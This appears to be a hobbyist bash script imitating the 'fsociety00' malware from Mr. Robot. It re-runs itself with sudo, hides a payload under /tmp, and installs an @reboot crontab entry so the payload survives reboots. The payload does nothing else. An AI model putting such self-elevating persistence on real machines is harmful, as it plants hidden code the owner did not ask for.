#!/bin/bash

# checks if its running as admin or not and if it isn't it will restart and run it as admin
if [ "$EUID" -ne 0 ]; then
    sudo "$0" "$@"
    exit $?
fi

# target directory for fsociety00 its gonna be in temp mainly cuz thats where alot of malware hides
targetDir="/tmp/fsociety00"
mkdir -p "$targetDir"

# opens to the directory after creation
cd "$targetDir" || exit

# Readme.txt file just like the fsociety lol
echo "-----readme.txt-----" > readme.txt
echo "" >> readme.txt
echo "LEAVE ME HERE" >> readme.txt
echo "" >> readme.txt
echo "-----readme.txt-----" >> readme.txt

# The actual fsociety00 cmd payload script whatever
cat <<'EOF' > fsociety00.sh
#!/bin/bash
# Persistence check
(crontab -l 2>/dev/null | grep -q "fsociety00") || (crontab -l 2>/dev/null; echo "@reboot /tmp/fsociety00/fsociety00.sh") | crontab -
EOF

chmod +x fsociety00.sh

# Run it in the background
./fsociety00.sh >/dev/null 2>&1 &

# Verification messages
if [ -f "fsociety00.sh" ]; then
    echo "fsociety00.cmd created successfully in $targetDir"
fi

if crontab -l 2>/dev/null | grep -q "fsociety00"; then
    echo "Scheduled task for fsociety00 created successfully"
fi
